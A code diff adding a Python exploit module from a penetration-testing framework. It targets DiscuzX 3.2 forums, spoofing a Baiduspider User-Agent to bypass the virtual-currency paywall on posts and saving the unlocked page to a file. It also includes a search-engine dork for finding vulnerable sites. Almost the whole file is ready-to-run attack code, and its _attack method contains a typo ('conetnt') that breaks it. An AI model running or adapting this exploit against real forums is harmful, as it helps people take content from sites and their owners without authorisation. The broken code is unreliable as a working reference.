@@ -1,0 +1,63 @@
+#!/usr/bin/env python
+#-*- coding:utf-8 -*-
+
+'''
+Pentestdb, a database for penetration test.
+Copyright (c) 2015 alpha1e0
+'''
+
+
+from script.libs.exploit import Exploit
+from script.libs.exploit import Result
+
+
+
+class DiscuzAB(Exploit):
+    expName = u"DiscuzX 3.2绕过虚拟币支付查看内容"
+    version = "1.0"
+    author = "alpha1e0"
+    language = "php"
+    appName = "discuz"
+    appVersion = "x3.2"
+    reference = ['http://www.secpulse.com/archives/33393.html','http://www.wooyun.org/bugs/wooyun-2010-099659']
+    description = u'''
+        漏洞利用条件：1.DiscuzX 3.2；2.没有其他权限设置
+        gh: inurl:forum.php "金币 才能浏览"
+    '''
+
+    def _verify(self):
+        result = Result(self)
+
+        sig = u"才能浏览"
+        userAgent = "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
+        #userAgent = "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://**.**.**.**/search/spider.html)"
+        headers = {'User-Agent':userAgent}
+
+        response = self.http.get(self.url)
+        response2 = self.http.get(self.url, headers=headers)
+
+        if response2.status_code==200:
+            if sig.encode("utf-8") in response.content and sig.encode("gbk")in response.content and  sig.encode("utf-8") not in response2.content and sig.encode("gbk") not in response2.content:
+                result['fullpath'] = self.url
+                result['payload'] = userAgent
+
+        return result
+
+
+    def _attack(self):
+        result = Result(self)
+
+        sig = u"才能浏览"
+        userAgent = "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
+        headers = {'User-Agent':userAgent}
+
+        response = self.http.get(self.url)
+        response2 = self.http.get(self.url, headers=headers)
+
+        if response2.status_code==200:
+            if sig.encode("utf-8") in response.content and sig.encode("gbk")in response.content and  sig.encode("utf-8") not in response2.content and sig.encode("gbk") not in response2.content:
+                with open("result.html","w") as fd:
+                    fd.write(response2.conetnt)
+                result['attachment'] = "result.html"
+
+        return result
